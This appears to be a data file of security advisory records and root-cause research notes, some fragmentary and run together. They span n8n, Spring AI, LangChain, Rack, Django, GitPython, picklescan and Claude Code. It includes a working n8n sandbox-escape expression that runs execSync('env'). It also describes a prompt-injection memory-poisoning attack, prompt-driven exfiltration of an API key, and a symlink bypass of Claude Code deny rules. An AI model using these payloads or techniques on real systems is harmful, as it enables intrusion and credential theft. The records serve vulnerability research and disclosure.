In VSCode (and forks), exploitation would allow an attacker to read arbitrary files, see the list of files open in the IDE, get selection and diagnostics events from the IDE, or execute code in limited situations where a user has an open Jupyter Notebook and accepts a malicious prompt. In JetBrains IDEs, an attacker could get selection events, a list of open files, and a list of syntax errors.

**Remediation**

We released a patch for this issue on June 13th, 2025. Although Claude Code auto-updates when you launch it and auto-updates the extensions, you should take the following steps (the exact steps depend on your IDE).

**VSCode, Cursor, Windsurf, VSCodium, and other VSCode forks**
Extension Name: Claude Code for VSCode

Instructions:

1. Open the list of Extensions (View->Extensions)
2. Look for Claude Code for VSCode among installed extensions
3. If you have a version < 1.0.24, click “Update” (or “Uninstall”)
4. Restart the IDE

**All JetBrains IDEs including IntelliJ, PyCharm, and Android Studio**
Plugin name: Claude Code [Beta]

Instructions:

1. Open the Plugins list
2. Look for Claude Code [Beta] among installed extensions
3. Update (or Uninstall) the plugin if the version is < 0.1.9
4. Restart the IDE

round6_research.bug_semantics: Broken access control / missing authorization (CWE-862) in n8n's credential permission enforcement: the pre-execution credential checks validated only a workflow's TOP-LEVEL node credentials, never credentials referenced inside an Execute Sub-workflow node's inline (parameter/file/URL) workflow JSON. A member with Editor access to a shared workflow could reference a credential they were not permitted to use inside that inline JSON; it passed save-time and runtime validation and resolved in the parent workflow's execution context, letting the member use or exfiltrate the credential (credential-use bypass for unshared credentials; attacker must know the target credential ID). CVSS 4.0 8.2. Fixed in n8n 1.123.67 / 2.31.5 / 2.32.1 (released 2026-07-22).
round6_research.evidence: GHSA-cj9h-qx8g-pq2g (alias CVE-2026-72763; OSV published 2026-07-22; npm n8n <1.123.67, 2.0.0-rc.0..<2.31.5, 2.32.0..<2.32.1; refs fix commit f69dfc6dd2178a14ea1624d2e1d403c2e755042f). n8n release process squashes weekly merges into bundles (n8n-assistant[bot], cherry-picked from private n8n-private): the security fix entered all lines on 2026-07-22 via 1.x bundle 1cd2c5fb22a906058cc083c3af2d561ce7f4332d (#34679), main 2.x bundle 2222fe3a6c886a9059f28e1b6d4bdb10ee420624 (#34680), 2.31.x f6cb6cf3ab177c3740a5ef624b89bae5165405a1 (#34688), 2.32.x f69dfc6dd2178a14ea1624d2e1d403c2e755042f (#34692). Fix diff (bundle f69dfc6dd2 vs parent db5e2d068b): CredentialsPermissionChecker gains checkForUser(userId, nodes) (finds credentials per user via CredentialsFinderService; throws InaccessibleCredentialForUserError if any referenced credential is not accessible); startExecution adds isInlineSubworkflow (code!==undefined && id===undefined) and calls checkForUser with additionalData.userId for inline sub-workflows instead of check(workflowData.id, ...), plus userId propagation for nested inline calls; getActiveCredentialTypes now returns null (check-all) for expression-valued nodeCredentialType/genericAuthType. Vulnerable behavior origin: PermissionChecker created by d35d63a855522c781b38238e107a6aaa211764c6 (2022-11-11, Ivan Ovejero, PR #4481 'Add credential runtime checks and prevent tampering in manual run') - check(workflowId, nodes) validated only top-level nodes against the workflow's projects; inline JSON (workflowJson parameter) of ExecuteWorkflow node predates it (node added 2019-12-19 by Jan Oberhauser). 2025-03-11 refactor ca9e62bdc011bf4fb856d5510af2025814f1a5c6 (netroy + Ivan Ovejero, #13795) renamed PermissionChecker to CredentialsPermissionChecker preserving semantics (verified diff). Marker scans: introducer d35d63a855 body has 0 AI markers; ca9e62bdc0 has only human Co-authored-by (Ivan Ovejero). The fix bundles' Co-authored-by trailers include 'Claude Opus 4.8 (1M context) <noreply@anthropic.com>' and 'Cursor <cursoragent@cursor.com>', but these are batch-release bundle trailers covering dozens of PRs (the bundle aggregates a full release batch; original PR is cherry-picked from n8n-private), not attributable to the security-fix author.
round6_research.flaw_origin: Security-control design gap: the runtime credential PermissionChecker (introduced 2022) scoped validation to the executed workflow's own node list and project, without ever descending into inline sub-workflow JSON. Inline sub-workflows carry no DB id/project, so the check failed open (id-undefined scope resolution), leaving their credentials unvetted against the triggering user. The 2025 refactor (#13795) preserved the flawed semantics.
round6_research.reasoning: The vulnerable behavior (runtime credential enforcement that never vets credentials embedded in inline sub-workflow JSON against the triggering user) was first written on 2022-11-11 by Ivan Ovejero (human) when the PermissionChecker was created - long before the AI-coding-assistant era and with no AI markers. The inline JSON feature it fails to cover predates the check (2019). The later refactor (2025) preserved the semantics. Fix-side bundle trailers mention Claude/Cursor, but they span entire release batches and the actual fix PR is hidden behind n8n-private; fix-side markers cannot flip the human-origin verdict. Introducer parent-absence holds (the enforcement boundary itself was created there). Verdict NOT_AI.

records.details:
### Summary
This notification is related to the CloudFront signing utilities in the AWS SDK for .NET, which are used to generate Amazon CloudFront signed URLs and signed cookies. A defense-in-depth enhancement has been implemented to improve handling of special characters, such as double quotes and backslashes, in input values.

### Impact
The CloudFront signing utilities build policy documents that define access restrictions for signed URLs and cookies. If an application passes unsanitized input containing special characters to these utilities, the resulting policy document may not reflect the application's intended access restrictions. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations. Applications that already follow AWS security best practices for input validation are not impacted.

### Impacted versions:
- AWS SDK for .NET V3 (`AWSSDK.CloudFront`): < 3.7.510.7
- AWS SDK for .NET V4 (`AWSSDK.Extensions.CloudFront.Signers`): 4.0.0.0 - 4.0.0.25

### Patches
On February 25th, 2026, an enhancement was made to the AWS SDK for .NET CloudFront signing utilities. The enhancement ensures that special characters in input values are correctly handled. We recommend upgrading to the latest version.

### Workarounds
No workarounds are needed, but customers should ensure that your application is following security best practices:
- Implement proper input validation in your application code before passing values to CloudFront signing utilities
- Update to the latest AWS SDK release on a regular basis
- Follow AWS security best practices for SDK configuration

### References
If there are any questions or comments about this advisory, contact AWS Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.

### Acknowledgement
AWS SDK for .NET thanks the Amazon Inspector Security Research team for identifying this issue and working through the coordinated process together.

round6_research.bug_semantics: Prompt injection via memory poisoning in PromptChatMemoryAdvisor (CWE-1336, high): when no conversation ID is supplied via the advisor context, getConversationId falls back to the shared constant DEFAULT_CHAT_MEMORY_CONVERSATION_ID ('default'); all such callers (potentially all users of an app) read/write ONE shared memory store. A malicious user's crafted input is stored as a USER memory message and later replayed into the augmented SYSTEM prompt of other users'/sessions' requests (memory rendered via PromptTemplate into the system text), manipulating model behavior across conversation turns.
round6_research.evidence: Identity: member_map pin alias-b83a8dd9 -> CVE-2026-41713 + GHSA-5852-phmh-8fhr (published 2026-05-12, high, CWE-1336; spring-ai-client-chat <1.0.7 and >=1.1.0-M1 <1.1.6, fixed 1.0.7/1.1.6). BIC c4784a07 (2024-05-25, Christian Tzolov <ctzolov@vmware.com>, 'Add ChatClient plugable advisors support') births the advisor framework incl. PromptChatMemoryAdvisor and AbstractChatMemoryAdvisor with the vulnerable design atomically present: 'DEFAULT_CHAT_MEMORY_CONVERSATION_ID = "default"' fallback in doGetConversationId and memory (USER+ASSISTANT msgs) joined into system text/params ('MEMORY:' section) - user-controlled content feeds the system prompt of later turns; parent 178a607c has zero PromptChatMemoryAdvisor hits (git grep exit 1); single-parent commit; %N trailers empty. Fix 'Require explicit conversation ID in chat memory advisors' removes DEFAULT_CONVERSATION_ID and the .conversationId() builder, throws IllegalArgumentException when context lacks CONVERSATION_ID, forcing explicit per-conversation IDs: main 59ab7521f0 (2026-04-30, Christian Tzolov <christian.tzolov@broadcom.com>, single parent 6715a6e1, no trailers), backports 13cde419e3 (v1.1.6 line, 2026-05-06) and e1402dea5b (v1.0.7 line, 2026-05-06); advisor later deprecated 917f62ebec and removed c3c7c86d48 (2026-05-01, 'Remove PromptChatMemoryAdvisor and fix NullAway violations') in favor of MessageChatMemoryAdvisor.
round6_research.flaw_origin: Cross-conversation memory bleeding via a shared default conversation ID combined with unescaped rendering of memory (attacker-controlled USER messages) into the system prompt.
round6_research.reasoning: The vulnerable behavior (shared default conversation ID + memory rendered into the system prompt across turns) is atomic to the advisor-framework birth commit c4784a07: parent-absence proven and the pattern is present in the file at its first revision; no earlier writer exists. All relevant commits are by human authors (Christian Tzolov, VMware/Broadcom; later fix commits likewise), with no Co-Authored-By/Co-authored-by trailers naming AI tools on the BIC, the fix (59ab7521, 13cde419, e1402dea), or the deprecation/removal commits. No AI-authorship signal -> NOT_AI.
round6_research.remaining_gap: CWE-1336 (template-engine neutralization) is a loose fit: the substantive flaw is shared-default-conversation memory poisoning; the fix removes the default rather than separating untrusted memory content in the prompt, so prompt-injection-via-memory remains possible within a single explicit conversation (inherent to the memory-advisor design, acknowledged in docs). round6_research.bug_semantics: Prompt template injection via attribute access: f-string templates are rendered with Python str.format (StrictFormatter) which permits attribute traversal and indexing (e.g. {msg.__class__.__name__}) and can reach object internals/globals when template strings (not just variables) are attacker-controlled. Mustache/jinja2 renderers similarly allowed attribute access. Affects langchain-core (f-string fixed; mustache/jinja2 defensively hardened). Fix c4b6ba254e restricts jinja2 sandbox to block all attribute/method access and rejects f-string variable names containing '.' or '['.
round6_research.evidence: OSV GHSA-6qv9-48xg-fc7f: template injection via attribute access in ChatPromptTemplate f-string/mustache/jinja2; affected langchain-core <1.0.7 (>=1.0.0) and <0.3.80. Fixes: c4b6ba254e (#34035, Eugene Yurtsev, 2025-11-19) and fa7789d6c212 (#34038, same author/backport; parent 889e8b6d). git log --diff-filter=A -- langchain/prompt.py -> 18aeb72012 (initial commit). git cat-file: 18aeb72012 has no parents (root). langchain/formatting.py in initial commit already defines StrictFormatter(Formatter) whose vformat calls str.format semantics permitting attribute access ({msg.__class__.__name__}); _FORMATTER_MAPPING['f-string']=formatter.format already wired in prompt.py of the initial commit. string.py later split (a5b61d59e1 refactor, parent dce26dfc has langchain/prompt.py but not prompts/string.py). Fix diff adds _RestrictedSandboxedEnvironment (blocks all getattr/is_safe_callable) for jinja2 and rejects '.'/'['/'[' variables for f-strings in get_template_variables. No AI markers (gpt|copilot|claude|codex|gemini|co-auth|generated|openai|anthropic regex) in introducer or fix commit bodies.
round6_research.flaw_origin: Design choice present since the initial commit: f-string prompt templates delegated to Python's str.format without restricting attribute/index access; the same attribute-permissive rendering carried into mustache (getattr-based) and jinja2 (SandboxedEnvironment) renderers. Exploitability for untrusted template strings was only recognized/restricted in Nov 2025 via get_template_variables validation and restricted sandbox.
round6_research.reasoning: The vulnerable behavior (attribute access permitted inside prompt templates) is present in langchain's root commit 18aeb72012 (Harrison Chase, 2022-10-24), which delegates f-string templates to Python str.format via StrictFormatter. The root commit has no parent, making it the minimum atomic introducer. records.details:
### Summary
The `roadiz/openid` package generates an OIDC nonce in `OAuth2LinkGenerator::generate()` and includes it in the authorization request sent to the identity provider, but **never stores it** and **never validates it** on the callback. The `OpenIdJwtConfigurationFactory` validation chain does not include a nonce constraint, and `OpenIdAuthenticator::authenticate()` never checks the nonce claim in the returned ID token against a stored value.

### Details
In `src/OAuth2LinkGenerator.php`, a nonce is created and sent to the IdP:
```php
'nonce' => $this->tokenGenerator->generateToken(),
```
However, this value is neither stored in session, cache, nor any other persistent store.

In `src/OpenIdJwtConfigurationFactory.php`, the JWT validation constraints are:
- `LooseValidAt` (expiry)
- `PermittedFor` (audience)
- `IssuedBy` (issuer)
- `HostedDomain` (optional)
- `UserInfoEndpoint` (optional)

**No nonce constraint is present.**

In `src/Authentication/OpenIdAuthenticator.php`, the `authenticate()` method validates the state CSRF token correctly (fixed in v2.7.10), but never retrieves a stored nonce or compares it against the `nonce` claim in the ID token.

### PoC
1. Obtain a valid ID token from a legitimate OIDC flow for a target user (e.g. via network interception, browser history leak, or referrer header exposure on a non-HTTPS redirect).
2. Replay the ID token: Since the nonce in the token is never cross-checked against a client-stored value, the token passes all validation constraints as long as it has not expired.
3. Result: An attacker can authenticate as the victim within the ID token's validity window.

Additionally, in an authorization code flow with multiple concurrent sessions, a malicious IdP or a compromised token endpoint could inject a token with a mismatched nonce, and the application would accept it silently.

### Impact
- **ID token replay attacks**: Valid but intercepted tokens can be reused for authentication within their validity period.
- **Token injection attacks**: A malicious or compromised identity provider can inject tokens across sessions without detection.
- Affects any Roadiz application using the `roadiz/openid` package with OpenID Connect SSO.

The OIDC Core 1.0 specification (Section 3.1.3.7) explicitly requires clients to verify the `nonce` claim if it was present in the authorization request.
records.summary: OpenID Connect nonce generated but never validated — ID token replay attack

round6_research.bug_semantics: DoS (CWE-400/CWE-776): REXML 3.3.3-3.4.1 parsing invalid XML containing multiple XML declarations can cause increased execution time and memory usage. Pre-fix process_instruction (rewritten by e2546e6) does a per-PI/declaration whitespace pre-check @source.match(/\s+/um, true); when a declaration/PI has no whitespace after its name (e.g. <?xml?>), IOSource#match's read-until-match loop fruitlessly reads the remainder of the stream into the scanner buffer (to EOF), inflating buffer/memory and execution time, and multiple XML declarations are silently accepted (no 'only once'/version checks). Fixed by 5859bdea which adds xml_declaration() validation (duplicated/missing-version checks) and Source#skip_spaces to stop the fruitless read.
round6_research.evidence: GHSA-c2f4-jgmc-q2r5 (ruby/rexml advisory, first_patched 3.4.2, refs commit 5859bdea); ruby-lang announcement 2025-09-18. Article/repo clone ruby_rexml (tags v3.3.2-v3.4.4): fix 5859bdea by NAITOH Jun (human, committer GitHub web-flow) adds xml_declaration() raising on duplicate ('XML declaration is duplicated'), missing version, missing spaces, and Source#skip_spaces; PR #282 body states the bug: 'In the case of @source.match?(/\s+/um, true), if there are no spaces at the beginning... it continues to read the buffer until it finds a match, but it never finds a match. As a result, it continues reading until the end of the file... drop_parsed_content occur frequently... may affect performance.' v3.3.2 process_instruction used one-shot INSTRUCTION_END = /#{NAME}(\s+.*?)?\?>/um (linear, no per-PI whitespace check); e2546e6 (2024-08-01, author=committer Sutou Kouhei <kou@clear-code.com>, human, no AI trailers; first shipped in tag v3.3.3 = affected-range start; parent 73661ef verified: process_instruction still INSTRUCTION_END-based, no parse_name-first flow, exact vulnerable line absent in process_instruction - fixed-string git grep rc=1 in that function) introduced parse_name-first + per-PI @source.match(/\s+/um, true) pre-check (baseparser.rb:668) and the nil-content '?>' path. 6cac15d (2024-08-01, tomoya ishida, committer GitHub, human) reworked IOSource#match to read-until-match with doubling min_bytes. v3.4.2 raises on duplicate declarations where 3.3.3-3.4.1 accept them. Empirical: 20k-250k repeated declarations parse linearly/fast in v3.3.2, v3.3.3, v3.4.1 worktrees; no dramatic amplification reproduced at tested shapes/scales (string+file IO sources, 150MB payload), so the exact reporter PoC is unverified, but code-level causal analysis matches the fix author's mechanism description and the 3.3.3 affected-range start.
round6_research.flaw_origin: parser refactor in the 3.3.3 window: e2546e6 'parse pi: improve invalid case detection' replaced v3.3.2's single one-shot INSTRUCTION_END match in process_instruction with a parse_name-first flow whose per-PI whitespace pre-check (@source.match(/\s+/um, true)) fruitlessly reads the remainder of the stream into the scanner buffer when a declaration/PI has no whitespace after the name; companion 6cac15d (same window) reworked IOSource#match into the read-until-match loop (no term:, min_bytes doubling). Both are needed for the new failure mode; e2546e6 is the first writer of the vulnerable per-declaration check.
round6_research.reasoning: Closed causal chain: (1) vuln = multiple XML declarations accepted + per-declaration whitespace pre-check causing fruitless read-to-EOF stream buffering (time/memory DoS; advisory + fix author description); (2) atomic introducer = e2546e6 which first wrote the per-PI whitespace pre-check/parse_name-first process_instruction (parent 73661ef lacks it; 6cac15d later/earlier? - preceding companion in same window makes the read-until-match loop; both human); (3) AI assessment: introducer authored/committed by Sutou Kouhei, long-time human REXML/Ruby maintainer; no bot/Co-Authored-By/Amp markers on the vulnerable lines or the companion commit; fix also human (NAITOH Jun). No evidence of AI authorship -> NOT_AI despite an AI-free project. The duplicated-declaration tolerance itself predates 3.3.3 (v3.3.2 also accepted duplicates without error) - the 3.3.3 window commits are the DoS carrier, which is what the advisory's affected range denotes.

round6_research.bug_semantics: Directory traversal via Rack::Directory (CWE-22 + CWE-548, high CVSS 7.5, rubygems rack <2.2.22 / >=3.0.0.beta1,<3.1.20 / >=3.2.0,<3.2.5; fixed 2.2.22, 3.1.20, 3.2.5). lib/rack/directory.rb check_forbidden allows any path containing '..' whose expanded form passes `::File.expand_path(::File.join(@root, path_info)).start_with?(@root)` - a string-prefix match without a path-boundary (separator) check. With root /var/www/root, a request like /../root_backup/ expands to /var/www/root_backup which passes the prefix check, so Rack::Directory serves a directory listing outside the configured root -> information disclosure of sibling directories sharing the root's prefix.
round6_research.evidence: Identity exact: GHSA-mxw3-3hh2-x2mh == CVE-2026-22860 (GitHub advisory API; summary 'Rack has a Directory Traversal via Rack:Directory'; description names directory.rb `File.expand_path(File.join(root, path_info)).start_with?(root)` and the /var/www/root vs root_backup example; vulns pin rack <2.2.22 / <3.1.20 / <3.2.5). Fix on main: 75c5745c286637a8f049a33790c71237762069e7 'Prevent directory traversal via root prefix bypass.' (2026-02-16, Masamune <125840508+Masamunee@users.noreply.github.com>) - adds @root_with_separator (`@root.end_with?(File::SEPARATOR) ? @root : root + SEPARATOR`) in initialize and changes check_forbidden to `expanded_path == @root || expanded_path.start_with?(@root_with_separator)`; backported as a5725c031b2717758851f1eadd9b9dfe7555745a (2-2-stable), 48e90303ea09cdcf5091104c1ffc94a2f74e2c5b (3-1-stable), f9bde3bc2dde2771185ac1a7b7602a4d9fa0a0d8 (3-2-stable), all same author/date/message; test/spec_directory.rb adds boundary cases. Introducer 64f53e4a (2019-11-25) is a one-line single-parent change by a freelance contributor; parent code blocks all '..' paths. AI-marker scan (copilot|claude|chatgpt|gpt-|codex|aider|co-authored|generated|gemini|llm) on introducer and all four fix commits: 0 matches. Rack is a mature, hand-maintained Ruby middleware gem (current maintainers: Jeremy Evans, Samuel Williams et al).
round6_research.flaw_origin: First writer of the vulnerable prefix check: 64f53e4a8c6dce5da0b7f81c0aa6629cf926cc5a 'Rack::Directory : allow directory trasversal inside root directory' (2019-11-25, Thomas <ts@tcare.fr>) - a one-line change adding `return if ::File.expand_path(::File.join(@root, path_info)).start_with?(@root)` to check_forbidden. Before it, ANY '..' path was unconditionally 403 (parent tree's check_forbidden has only `return unless path_info.include? '..'` then 403) -> the commit is what first permits traversal-via-prefix and is the exact source of the CVE's bypass (/../root_backup passes start_with?). round6_research.bug_semantics: Decompression bomb DoS (CWE-409 / CWE-400) in httplib2/__init__.py _decompressContent(): HTTP responses with Content-Encoding: gzip or deflate are decompressed with gzip.GzipFile(fileobj=io.BytesIO(new_content)).read() (no size argument) and zlib.decompress(content, zlib.MAX_WBITS) (no size bound) - both fully unbounded. round6_research.bug_semantics: Fail-open authorization (IDOR / CWE-862 / CWE-639 / CWE-613) in the MCP tool layer: scoped (agent) callers can perform cross-task and cross-session mutations. The MCP server authenticates all outbound gRPC with the full server API key and backend gRPC handlers do no caller-based authorization, so the MCP tool layer is the sole authorization boundary. Several destructive tools (task_update, task_delete, task_resume, session_kill, session_resume) omit the assertCallerIsAncestor ancestry/workspace check that their siblings (task_complete, task_start, session_attach, session_send_input) perform; a workspaceless scoped token also skips the task_show workspace check and fails open to all workspaces (F7). round6_research.bug_semantics: Expression sandbox bypass (CWE-95, RCE) in n8n expressions. The expression compiler (tournament/babel) compiles user expressions in {{ }} and runs them inside a Proxy-based vm sandbox; the AST sanitizer PrototypeSanitizer (packages/workflow/src/expression-sandboxing.ts, formerly ExpressionSandboxing.ts) blocks member lookups of forbiddenMembers ['__proto__','prototype','constructor','getPrototypeOf'] but never bans `with` statements. A `with(function(){}){...}` block inside an expression creates a scope object function whose prototype chain resolves the free variable `constructor` to the Function constructor, bypassing the sanitizer and the sandbox Proxy, enabling arbitrary code execution (PoC: {{ (function(){ var constructor = 123; with(function(){}){ return constructor("return process.mainModule.require('child_process').execSync('env').toString().trim()")() } })() }}). Affects n8n <1.123.17, [2.0.0,2.4.5), [2.5.0,2.5.1). JFrog-discovered (Natan Nehorai), published 2026-01-27.
round6_research.evidence: OSV/already-documented vulnerability: expression Node RCE, CVE-2026-1470/GHSA-5xrp-6693-jjx9, CWE-95, CVSS 9.9, JFSA-2026-001651697 (JFrog, Natan Nehorai). Fix aa4d1e5825829182afa0ad5b81f602638f55fa04 (2026-01-22, 'Merge commit from fork' by Iván Ovejero, committer Benjamin Schroth) + siblings 25c4b9605b420a98d0185a4f01115122a5134d8f and 30383d86139f3279a698df8d229eadfefe8627f4 add ExpressionWithStatementError, visitWithStatement() in PrototypeSanitizer ASTAfterHook, and RESERVED_VARIABLE_NAMES (___n8n_data,__sanitize) bans, all in pre-existing packages/workflow/src/expression-sandboxing.ts. File born at 8e7d29ad3c4872b1cc147dfcfe9a864ba916692f (2024-08-13) as ExpressionSandboxing.ts (58 insertions, PrototypeSanitizer without with-statement handling); renamed lowercase by 3a2a70f193ac3384452c09ec94fd43baf6d012a1 (2025-05-27, casing PR #15755, pure rename). Parent 117e2d968fcc535f32c583ac8f2dc8a84e8cd6bd: git ls-tree shows no expression-sandboxing file and git grep shows no withStatement handling in packages/workflow/src (0 occurrences) - behavior fully new at introducer. BIC git log -1 body contains no Co-Authored-By trailers (author Val <68596159+valya@users.noreply.github.com>, committer GitHub); fix commits authored by Iván Ovejero <ivov.src@gmail.com>, no Co-Authored-By trailers.

records.details:
When using Claude Code with Yarn installed, Yarn config files can trigger code execution when running `yarn --version`. This could lead to a bypass of the directory trust dialog in Claude Code, as plugins and `yarnPath` could be executed prior to the user accepting the risks of working in an untrusted directory. Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.

Thank you to Benjamin Faller, Redguard AG and Michael Hess for reporting this issue!

round6_research.bug_semantics: scan_bypass
round6_research.evidence: GHSA-mjqp-26hc-grxg / CVE-2025-10156 (picklescan, first patched 0.0.31, vulnerable <= 0.0.30): zipfile's per-file CRC check raises BadZipFile on entries with corrupted CRC; scan_zip_bytes cannot read such entries, so the archive's pickles are never scanned while PyTorch (which disables CRC on load) still executes/loads them - scanner bypass. Empirically reproduced with picklescan 0.0.30 in a venv: malicious eval-based pickle (Malicious1 __reduce__) inside a bad-CRC zip returns issues=0/scanned=0 (missed), while the identical content with a good CRC is flagged (issues=1), and direct .pkl scan flags it (issues=1). Fix commit 28a7b4ef (Matthieu Maitre, 2025-09-08, 'Fix various vulnerabilities (#50)', first tag v0.0.31) modifies src/picklescan/relaxed_zipfile.py: after opening an entry via ZipExtFile it sets zef._expected_crc = None (disabling CRC validation to align with PyTorch), and adds regression fixtures tests/data2/malicious1_crc.zip + assert_scan('malicious1_crc.zip', [Global('builtins','eval',...)]).
round6_research.flaw_origin: introduced_with_feature
round6_research.reasoning: The vulnerable behavior (ZIP-archive scanning that validates per-entry CRC with stdlib zipfile.ZipFile, so bad-CRC entries skip scanning entirely) was introduced atomically on 2022-09-04 by c1d5abd 'Implement Pickle scanner' (Matthieu Maitre): its scan_zip_bytes opens zipfile.ZipFile and reads entries with no CRC tolerance and no exception handling; parent 6a76b8c3 ('Add boilerplate', 2022-09-03) contains only .gitignore/LICENSE/README.md/conda.yaml/requirements.txt/setup.cfg - zero picklescan code, verified via ls-tree. A later intermediate e58e45e0 (2025-03-08, Trevor Madge/Sonatype + Matthieu Maitre, fork merge) replaced stdlib ZipFile with RelaxedZipFile (still keeping CRC validation on, ZipExtFile(..., ..., pwd, True)), preserving the flaw; the GHSA recommendation and the actual fix were to disable CRC there (zef._expected_crc = None). Author of introducer and fix is the human maintainer Matthieu Maitre; 13-term AI-marker scan on both commit bodies is clean (rc=1 both). Flaw is a human design gap (stdlib CRC validation kept while PyTorch skips CRC), not an AI artifact.

round6_research.bug_semantics: HTTP header injection (CWE-93/CWE-20) via newline acceptance in DomainNameValidator: the validator regex is compiled as re.IGNORECASE '^' + hostname_re + domain_re + tld_re + '$' and the '$' anchor in Python regex matches end-of-string OR immediately before a trailing newline, so a value ending with '\n' passes validation; when such a validated domain/name is later interpolated into an HTTP response header, the embedded newline splits the header and lets an attacker inject arbitrary headers (reported by Bence Nagy; inherent flaw, no separate CWE assigned)
round6_research.evidence: OSV GHSA-8qcx-xf44-272x + CVE-2026-53878 (alias pair hash verified: sha256('CVE-2026-53878\nGHSA-8qcx-xf44-272x\n')[:24]==be6bc5e2091e7fa31af00745; pair resolved by brute-forcing (id, alias) combos from OSV alias fetches for django/django after cohort bucket + extended 126-id pool brute force failed). Advisory: DomainNameValidator does not prohibit newlines; affects Django 5.2 <=5.2.15 / 6.0 <=6.0.6; fixed 5.2.16 / 6.0.7; reported by Bence Nagy. Fix 3a720d0d8b (2026-06-11, Natalia <124304+nessita@users.noreply.github.com>, 'Fixed CVE-2026-53878 -- Prevented newlines from being accepted in DomainNameValidator.', thanks Bence Nagy) restructures to build a regex_parts list ending with r'\Z' instead of '$' (both accept_idna and ascii_only branches) so a trailing newline no longer matches; found via git log -S 'self.tld_re + r"$"'. Introducer 99dcc59237 (2024-10-16) diff in django/core/validators.py: '- self.hostname_re + self.domain_re + self.tld_re, re.IGNORECASE' -> '+ r"^" + self.hostname_re + self.domain_re + self.tld_re + r"$", re.IGNORECASE' (same for ascii_only branch); parent 65f3cfce has DomainNameValidator without the anchors (line-level check: existing file, new lines -> introducer_parent_absent=False). AI marker grep (co-authored|assisted-by|anthropic|claude|copilot|codex|openai|generated|mastra|gemini|bard|cursor): introducer 99dcc59237 raw count 1 but sole match is the human reviewer name 'Claude Paroz' credited in the commit body (false positive -> effective 0); fix 3a720d0d8b = 0; original 4971a9afe5 (2021) body credits 'Claude Paroz' + 'Co-authored-by: Nina Menezes' (both human, false positives). round6_research.bug_semantics: LPE (CWE-250): during filesystem resize, libblockdev's generic fs_mount temp-mounts the device with no security options (no nosuid,no nodev); udisks normally mounts user images with nosuid,nodev, but a crafted XFS image (SUID-root shell) resized via this path is mounted with privileges, letting an allow_active local user escalate to root
round6_research.evidence: GHSA-mpgj-hch9-5rvx (published 2025-06-19, HIGH): libblockdev LPE via udisks XFS-resize mount of crafted image. Fix = 4e35eb93 (Thomas Blume SUSE, 2025-05-16, 'Don't allow suid and dev set on fs resize', Fixes: CVE-2025-6019): src/plugins/fs/generic.c fs_mount temp-mount now uses 'nosuid,nodev' (or 'nosuid,nodev,ro' when read-only) instead of 'ro'/NULL. Merged to master 2025-06-18 via 'Merge commit from fork' 207895a3 (Vojtech Trefny), first release 3.4.0; backports 46b54414 (3.3.x-devel, in 3.3.1) and c9cd14c4 (3.2.x-devel). Introducer = 07b49e45 (Vojtech Trefny, 2017-05-31, 'Add a generic filesystem resize function') which added the temp-dir bd_fs_mount(device, mountpoint, 'xfs', NULL, NULL, error) with NULL options (no suid/nodev hardening); parent 828cd420 has zero 'temporary directory' hits in src/plugins/fs.c (git grep rc=1) -> whole block absent. Line evolution: 2b55f566 (2020, NILFS2, fstype param), 3fce7863 (2017, file split), 49c72f75 (2023, read_only 'ro'). All 8 relevant commits marker-scan clean (13-term pattern; human names only).

Both fix and introducer are human-authored (2017/2025, no AI markers on any commit in the chain). Fix authorship is not evidence of AI-introduced flaw. Verdict: NOT_AI.

When a caller omitted api_key, the tool fell back to the operator's ELASTICSEARCH_API_KEY environment variable and sent it in the Authorization header to whichever host the LLM specified via es_url/cloud_id; a crafted prompt could exfiltrate the operator's Elasticsearch API key to an attacker-controlled server. Fixed in strands-agents-tools 0.7.0 by moving all connection parameters to environment variables only.

records.details:
Claude Code failed to strictly enforce deny rules configured in settings.json when accessing files through symbolic links. If a user explicitly denied Claude Code access to a file (such as /etc/passwd) and Claude Code had access to a symbolic link pointing to that file, it was possible for Claude Code to read the restricted file through the symlink without triggering deny rule enforcement.

Users on standard Claude Code auto-update received this fix automatically. Users performing manual updates are advised to update to the latest version.

partial_wave.bug_semantics: GHSA-94v3-77j7-vm48 (CVE-2026-54481): modules/private/internal.go hardcodes TLSClientConfig.InsecureSkipVerify = true with no config override (the only outbound TLS client in the codebase without a SkipVerify toggle). round6_research.bug_semantics: Argument injection / arbitrary file overwrite (CWE-88): Diffable.diff() forwards **kwargs straight into git diff/diff-tree with no check_unsafe_options guard, and inserts caller-supplied 'other' ref BEFORE the '--' separator (git/diff.py args.insert(0, other)), so a value like --output=/path is parsed by git as an option; git diff --output=<path> then truncates and writes real diff/patch bytes to an attacker-chosen path (e.g. ~/.ssh/authorized_keys). Affects Commit/Tree/IndexFile/Submodule diffs; fixed in 3.1.54.
round6_research.evidence: GHSA-fjr4-x663-mwxc (published 2026-07-24, severity high, CWE-88, first_patched 3.1.54, refs PR #2180 + commit 1d51b891, reported by zx (Jace) @manus-use): Diffable.diff() at git/diff.py builds and runs the diff command with no check_unsafe_options anywhere and does args.insert(0, other) before '--', so both key-control (output= kwarg) and value-control (other='--output=/path') overwrite arbitrary files; live-verified on tag 3.1.53. Fix 1d51b891 (2026-07-22) adds unsafe-option guard, 14 insertions in git/diff.py + git/index/base.py + test. git log -S 'def diff(' -- git/diff.py: first appearance aed099a7 (move of Diffable from objects/base.py); parent 17852bde of aed099a7 already had def diff in base.py; git log -S 'def diff(' -- lib/git/objects/base.py: b372e263 introduced Diffable.diff; parent bb24f67e has only classmethod Commit.diff(cls, repo, a, b=None, paths=None) with NO **kwargs forwarding (verified body: text = repo.git.diff('-M', full_index=True, *paths)). git grep -c 'def diff' bb24f67e -- lib/git/objects/base.py: no match (only commit.py classmethod). Diffable surface: Commit, Tree, IndexFile, Submodule.
round6_research.flaw_origin: b372e263 'added Diffable interface to objects.base' (2009-10-16, Sebastian Thiel) first wrote Diffable.diff(self, other=None, paths=None, create_patch=False, **kwargs) which builds the git diff argv, inserts self, inserts other before the '--' separator, and passes unguarded **kwargs to repo.git.diff() (later moved to git/diff.py by aed099a7 2009-10-18). Parent only had a kwargs-less classmethod Commit.diff(cls, repo, a, b, paths) which did not forward **kwargs. records.details:
